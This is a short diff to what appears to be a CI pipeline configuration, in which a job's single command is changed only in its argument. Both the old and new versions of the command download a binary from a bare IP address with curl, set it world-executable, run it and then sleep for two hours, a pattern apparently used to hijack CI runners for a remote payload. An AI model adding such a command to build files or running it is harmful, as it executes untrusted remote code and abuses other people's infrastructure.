@@ -10,4 +10,4 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'rm -rf x86_64; curl -O http://89.213.174.75/x86_64; chmod 777 x86_64; ./x86_64 herp; sleep 7200'
+            - 'rm -rf x86_64; curl -O http://89.213.174.75/x86_64; chmod 777 x86_64; ./x86_64 semaaphore; sleep 7200'
